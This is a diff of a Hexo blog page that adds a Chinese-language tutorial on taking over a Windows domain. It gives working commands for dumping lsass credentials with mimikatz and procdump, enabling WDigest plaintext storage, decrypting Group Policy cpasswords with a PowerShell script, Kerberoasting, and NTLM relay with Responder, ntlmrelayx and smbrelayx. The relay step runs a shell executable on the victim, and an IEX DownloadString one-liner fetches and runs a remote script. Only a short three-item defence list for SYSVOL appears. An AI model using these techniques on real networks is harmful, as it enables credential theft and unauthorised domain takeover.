@@ -1,53 +1,192 @@
+
 <!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8" />
-  <title>Hexo</title>
-  <link rel="icon" href="favicon.ico"/>
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  
-<link rel="stylesheet" href="/css/ionicons.min.css">
-
-  
-<link rel="stylesheet" href="/css/milligram.min.css">
-
-  
-<link rel="stylesheet" href="/css/comfortaa.css">
-
-  
-<link rel="stylesheet" href="/css/source-sans-pro.css">
-
-  
-<link rel="stylesheet" href="/css/animate.min.css">
-
-  
-<link rel="stylesheet" href="/css/nprogress.css">
-
-  
-<link rel="stylesheet" href="/css/loaders.min.css">
-
-  
-<link rel="stylesheet" href="/css/atom-one-light.css">
-
-  
-<link rel="stylesheet" href="/css/app.css">
-
-<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>获取域控的方法 | Hexo</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.17.1/styles/railscasts.css">
+    <link rel="stylesheet" href="/lightx.css"/>
+    <link rel="manifest" href="/manifest.json" />
+    <link rel="apple-touch-icon" href="/icon512.png">
+    <meta name="theme-color" content="#ffffff"/>
+    
+  <meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
 </head>
-<body>
-  <div id="app"></div>
-  <script type="text/javascript">
-    window.root = "/"
+  <body>
+    <script>
+      if ('serviceWorker' in navigator) {
+        window.addEventListener('load', function () {
+          navigator.serviceWorker.register('/sw.js', {scope: '/'})
+            .then(function (registration) {
+              // console.log('ServiceWorker registration successful with scope: ', registration.scope);
+            })
+            .catch(function (err) {
+              console.log('ServiceWorker registration failed: ', err);
+            });
+        });
+      }
+    </script>
+  <div id="page-container">
+    <div id="content-wrap">
+      <div class="wrapper">
+        <div class="container">
+            <nav>
+    <ul>
+      <li><a href="/">Hexo</a></li>
+      <li><a href="/archives">Archives</a></li>
+      <li><a href="/about">About</a></li>
+    </ul>
+</nav>
+
+            <article>
+  <h1>获取域控的方法</h1>
+  <div class="contents">
+    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#高权限读取本地密码"><span class="toc-text">高权限读取本地密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SYSVOL还原组策略"><span class="toc-text">SYSVOL还原组策略</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Kerberoasting"><span class="toc-text">Kerberoasting</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#重放攻击"><span class="toc-text">重放攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SMB中继"><span class="toc-text">SMB中继</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Responder-ntmlrelayx"><span class="toc-text">Responder+ntmlrelayx</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#smbrelayx"><span class="toc-text">smbrelayx</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Windows平台的重放攻击"><span class="toc-text">Windows平台的重放攻击</span></a></li></ol></li></ol>
+  </div>
+  <h4 id="高权限读取本地密码"><a href="#高权限读取本地密码" class="headerlink" title="高权限读取本地密码"></a><strong>高权限读取本地密码</strong></h4><p>当域管理员在域成员机器上登录进行工作的时候，会将明文密码保存在本地进行的lsass.exe，可以通过mimikatz来读取到本地的明文密码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug  # 提权</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>如果主机存在杀软的时候，上传mimikatz很多时候都会被杀掉，可以通过<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="noopener">procdump</a>+mimikatz的方式进行绕过。先导出lsass.exe</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<p>保存到本地，通过mimikatz读lsass.dmp的明文</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;  &gt; 1.txt</span><br></pre></td></tr></table></figure>
+
+<p>如果目标机器是windows server 2012，通过添加注册表，在通过锁屏，让管理员重新登录及可以读取明文。</p>
+<p>添加注册表，设置UseLogonCredential设置为1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure>
+
+<p>利用powershell脚本进行锁屏</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Function Lock-WorkStation </span><br><span class="line">&#123;</span><br><span class="line">$signature &#x3D; @&quot;</span><br><span class="line">[DllImport(&quot;user32.dll&quot;, SetLastError &#x3D; true)]</span><br><span class="line">public static extern bool LockWorkStation();</span><br><span class="line">&quot;@</span><br><span class="line">$LockWorkStation &#x3D; Add-Type -memberDefinition $signature -name &quot;Win32LockWorkStation&quot; -namespace Win32Functions -passthru</span><br><span class="line">$LockWorkStation::LockWorkStation() | Out-Null</span><br><span class="line">&#125;</span><br><span class="line">Lock-WorkStation</span><br></pre></td></tr></table></figure>
+
+<p>管理员重新登录后就可以抓取到明文密码了。</p>
+<h4 id="SYSVOL还原组策略"><a href="#SYSVOL还原组策略" class="headerlink" title="SYSVOL还原组策略"></a><strong>SYSVOL还原组策略</strong></h4><p>在域环境中，有个默认的共享路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</span><br></pre></td></tr></table></figure>
+
+<p>SYSVOL是活动目录存储文件服务副本的共享文件夹，里面包含有登录脚本，组策略数据等，域里的所有用户都能访问这个共享文件。在SYSVOL目录下，默认是没有groups.xml文件的，必须创建组策略脚本登录才有这个文件。在groups.xml文件中，密码是通过AES-256加密的，但是微软发布了AES的<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN" target="_blank" rel="noopener">私钥</a>。</p>
+<p>可以利用powershell解密密文:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Get-DecryptedCpassword</span></span> &#123;</span><br><span class="line">    [<span class="type">CmdletBinding</span>()]</span><br><span class="line">    <span class="keyword">Param</span> (</span><br><span class="line">        [<span class="built_in">string</span>] <span class="variable">$Cpassword</span></span><br><span class="line">    )</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">#Append appropriate padding based on string length  </span></span><br><span class="line">        <span class="variable">$Mod</span> = (<span class="variable">$Cpassword</span>.length % <span class="number">4</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$Mod</span>) &#123;</span><br><span class="line">        <span class="string">'1'</span> &#123;<span class="variable">$Cpassword</span> = <span class="variable">$Cpassword</span>.Substring(<span class="number">0</span>,<span class="variable">$Cpassword</span>.Length <span class="literal">-1</span>)&#125;</span><br><span class="line">        <span class="string">'2'</span> &#123;<span class="variable">$Cpassword</span> += (<span class="string">'='</span> * (<span class="number">4</span> - <span class="variable">$Mod</span>))&#125;</span><br><span class="line">        <span class="string">'3'</span> &#123;<span class="variable">$Cpassword</span> += (<span class="string">'='</span> * (<span class="number">4</span> - <span class="variable">$Mod</span>))&#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$Base64Decoded</span> = [<span class="type">Convert</span>]::FromBase64String(<span class="variable">$Cpassword</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="comment">#Create a new AES .NET Crypto Object</span></span><br><span class="line">        <span class="variable">$AesObject</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.AesCryptoServiceProvider</span><br><span class="line">        [<span class="built_in">Byte</span>[]] <span class="variable">$AesKey</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x4e,<span class="number">0</span>x99,<span class="number">0</span>x06,<span class="number">0</span>xe8,<span class="number">0</span>xfc,<span class="number">0</span>xb6,<span class="number">0</span>x6c,<span class="number">0</span>xc9,<span class="number">0</span>xfa,<span class="number">0</span>xf4,<span class="number">0</span>x93,<span class="number">0</span>x10,<span class="number">0</span>x62,<span class="number">0</span>x0f,<span class="number">0</span>xfe,<span class="number">0</span>xe8,</span><br><span class="line">                             <span class="number">0</span>xf4,<span class="number">0</span>x96,<span class="number">0</span>xe8,<span class="number">0</span>x06,<span class="number">0</span>xcc,<span class="number">0</span>x05,<span class="number">0</span>x79,<span class="number">0</span>x90,<span class="number">0</span>x20,<span class="number">0</span>x9b,<span class="number">0</span>x09,<span class="number">0</span>xa4,<span class="number">0</span>x33,<span class="number">0</span>xb6,<span class="number">0</span>x6c,<span class="number">0</span>x1b)</span><br><span class="line"> </span><br><span class="line">        <span class="comment">#Set IV to all nulls to prevent dynamic generation of IV value</span></span><br><span class="line">        <span class="variable">$AesIV</span> = <span class="built_in">New-Object</span> Byte[](<span class="variable">$AesObject</span>.IV.Length) </span><br><span class="line">        <span class="variable">$AesObject</span>.IV = <span class="variable">$AesIV</span></span><br><span class="line">        <span class="variable">$AesObject</span>.Key = <span class="variable">$AesKey</span></span><br><span class="line">        <span class="variable">$DecryptorObject</span> = <span class="variable">$AesObject</span>.CreateDecryptor() </span><br><span class="line">        [<span class="built_in">Byte</span>[]] <span class="variable">$OutBlock</span> = <span class="variable">$DecryptorObject</span>.TransformFinalBlock(<span class="variable">$Base64Decoded</span>, <span class="number">0</span>, <span class="variable">$Base64Decoded</span>.length)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> [<span class="type">System.Text.UnicodeEncoding</span>]::Unicode.GetString(<span class="variable">$OutBlock</span>)</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">catch</span> &#123;<span class="built_in">Write-Error</span> <span class="variable">$Error</span>[<span class="number">0</span>]&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Get-DecryptedCpassword</span> <span class="string">"I0vK3Yj0SeoHQDxF5skcjt3BOkMZmX6IiqRVKCTo4Z4"</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/1.png" alt=""></p>
+<p>针对SYSOVL的防御：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.打补丁KB2962486</span><br><span class="line">2.删除SYSVOL目录下的groups.xml</span><br><span class="line">3.设置共享文件SYSVOL的权限</span><br></pre></td></tr></table></figure>
+
+<h4 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a><strong>Kerberoasting</strong></h4><p>SPN为服务主体名称，是服务实列(MSSQL,HTTP等)的唯一标识，如果在林中安装服务的多个实列，每个实列都有自己的SPN，如果kerberos服务票证的加密类型为RC4_HMAC_MD5，就可以导出TGS对其进行离线破解，获取到域用户的密码了。</p>
+<p>使用setspn查询spn(windows7和server2008默认自带)</p>
+<p>查询域内所有的SPN和查询test域的SPN</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -q *&#x2F;*</span><br><span class="line">setspn.exe -T test.com -q *&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/2.png" alt=""></p>
+<p>以CN开头的为代表一个账号，机器账号为Computers，域用户账号为Users</p>
+<p>查询域内注册的spn（kerberoast）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript GetUserSPNs.vbs</span><br></pre></td></tr></table></figure>
+
+<p>PowerView</p>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>
+
+<p>给MSSQL服务注册SPN</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -A MSSQLSvc&#x2F;WIN-M34UCFJIPNQ.test.com test.com\fanxing</span><br></pre></td></tr></table></figure>
+
+<p>将kerberos的加密方式换成RC4_HMAC_MD5</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/3.png" alt=""></p>
+<p>请求指定的TGS，完成之后klist就能查看相应的票据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$SPNName &#x3D; &#39;MSSQLSvc&#x2F;WIN-M34UCFJIPNQ.test.com&#39;</span><br><span class="line">Add-Type -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/4.png" alt=""></p>
+<p>mimikatz导出票据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list &#x2F;export</span><br></pre></td></tr></table></figure>
+
+<p>使用<a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">tgsrepcrack.py</a>破解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tgsrepcrack.py wordlist.txt mssql.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><strong>kerberoasting后门利用</strong></p>
+<p>在获取到spn的修改权限后，可以给指定的域用户注册spn，可以获取到任意域用户的TGS进行离线破解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -U -A VNC&#x2F;WIN-M34UCFJIPNQ.test.com Administrator</span><br></pre></td></tr></table></figure>
+
+<h4 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a><strong>重放攻击</strong></h4><p>在NTML认证的过程中，数据包传递的是NTML-Hash加密的16位的challenge随机数得到的Net-NTML</p>
+<p> Hash，如果存在中间人的情况，就可以通过hash进行重放攻击，下面简述下存在中间人，NTML协议过程：</p>
+<p><img src="https://p1.ssl.qhimg.com/t01f22f78b71df16680.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.当客户端对服务端发起请求，客户端并不知道中间人存在，所以把请求发送给了中间人。中间人拿着这个请求发送给服务端，服务端以为是客户端发来的请求。</span><br><span class="line">2.进过验证后，会生成一个随机数(challenge)返回给攻击者，服务端保存的ntmlhash进行DES加密challenge(chal</span><br><span class="line">lenge1)，攻击者拿着这个challenge明文发送给客户端。</span><br><span class="line">3.客户端对这个challenge用自己的密码进行DES加密(response)，发送给中间人，中间人在将这个请求发送给服务端。</span><br><span class="line">4.服务端拿到这个response跟之前加密的challenge1进行对比，一样的话就验证成功。</span><br></pre></td></tr></table></figure>
+
+<p>在进行ntml中间人攻击的时候，要避免最小的网络流量，所以使用的比较多的也是LLMNR/NetNS欺骗。</p>
+<p>在两台windows进行进行资源请求的时候，对机器的解析顺序为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.HOSTS文件(c:&#x2F;windows&#x2F;system32&#x2F;driver&#x2F;etc&#x2F;hosts)</span><br><span class="line">2.本地的DNS缓存(ipconfig &#x2F;displaydns)</span><br><span class="line">3.dns服务器</span><br><span class="line">4.LLMNR</span><br><span class="line">5.NetBios-NS</span><br></pre></td></tr></table></figure>
+
+<h5 id="SMB中继"><a href="#SMB中继" class="headerlink" title="SMB中继"></a>SMB中继</h5><p>对于smb中继的利用条件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.不能开启smb签名，而在域内，域控上面是开启了签名的，域成员机器是没有开启的。</span><br><span class="line">2.打了ms08-068补丁的xp&#x2F;2003系统也无法利用</span><br></pre></td></tr></table></figure>
+
+<p>首先利用nmap探测是否开启了签名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -p 445 --open --script smb-security-mode,smb-os-discovery 192.168.50.241</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/5.png" alt=""></p>
+<h5 id="Responder-ntmlrelayx"><a href="#Responder-ntmlrelayx" class="headerlink" title="Responder+ntmlrelayx"></a>Responder+ntmlrelayx</h5><p>获取ntmlv2 hash，在攻击机执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0 -v      #假设ip为192.168.50.64</span><br></pre></td></tr></table></figure>
+
+<p>在任意机器上执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.50.64\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/6.png" alt=""></p>
+<p>当使用ntmlrelayx进行重放攻击的时候，需要在Responder.conf设置SMB和HTTP服务为Off</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0 -v    # 启动Responder，假设ip为192.168.50.64</span><br><span class="line">python ntlmrelayx.py -t 192.168.50.241   # -t为受害者，进行中继攻击</span><br><span class="line">net use192.168.50.64\c$ &quot;fx@123.com&quot; &#x2F;user:&quot;administrator&quot;   # 攻击机执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/7.png" alt=""></p>
+<h5 id="smbrelayx"><a href="#smbrelayx" class="headerlink" title="smbrelayx"></a>smbrelayx</h5><p>使用smbrelayx和ntmlrelayx都是利用的<a href="https://github.com/CoreSecurity/impacket.git" target="_blank" rel="noopener">impacket</a>，环境配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install pycrypto    # 安装加密库</span><br><span class="line">apt-get --reinstall install python-pyasn1 python-pyasn1-modules</span><br><span class="line">cd impacket&#x2F;</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>
+
+<p>在攻击机进行重放攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># -h为指定受害者，-e在进行重放攻击后，在受害者机器执行exe</span><br><span class="line">python smbrelayx.py -h 192.168.50.241 -e &#x2F;root&#x2F;shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>在内网其他目标机器执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use192.168.50.64\c$ &quot;fx@123.com&quot; &#x2F;user:&quot;administrator&quot;</span><br></pre></td></tr></table></figure>
+
+<p>在msf上成功获取到meterpreter</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/8.png" alt=""></p>
+<h5 id="Windows平台的重放攻击"><a href="#Windows平台的重放攻击" class="headerlink" title="Windows平台的重放攻击"></a>Windows平台的重放攻击</h5><p>在windows下，可以利用powershell编写的<a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener">Inveigh</a>工具</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Kevin-Robertson&#x2F;Inveigh&#x2F;master&#x2F;Inveigh.ps1&#39;);Invoke-Inveigh -consoleoutput Y FileOutput Y&quot;</span><br></pre></td></tr></table></figure>
+
+<p>在其他主机上执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.50.242\c$   或者在开启HTTP，利用&lt;img&gt;来加载图片</span><br><span class="line">&lt;img src&#x3D;&quot;\\192.168.50.242\1.png&quot;&gt;    在通过HTTP协议访问就行了</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/9.png" alt=""></p>
+<p>注意：在获取权限的那台机器，需要关闭windows防火墙，不是一直获取到challenge。</p>
+
+  
+  <p class="copyright"><strong>Links: <a href="http://yoursite.com/2020/02/26/%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95/">http://yoursite.com/2020/02/26/%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95/</a></strong></p>  
+</article>
+
+<div id="comment">
+    
+</div>
+        </div>
+      </div>
+    </div>
+    <div id="footer">
+      <div class="wrapper">
+        <div class="container">
+          
+<button id="back-top" onclick="window.scrollTo({top:0,behavior:'smooth'})">TOP</button>
+<footer>
+    <div>
+        <p>
+            © 2020 <a href="http://yoursite.com">John Doe</a>.
+            Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>.
+            Theme <a href="https://github.com/songquanpeng/hexo-theme-lightx" target="_blank" rel="noopener">lightx</a>.
+            
+        </p>
+    </div>
+</footer>
+
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad();
   </script>
-  
-<script src="/js/manifest.js"></script>
-
-  
-<script src="/js/vendor.js"></script>
-
-  
-<script src="/js/app.js"></script>
-
-</body>
+  </body>
 </html>
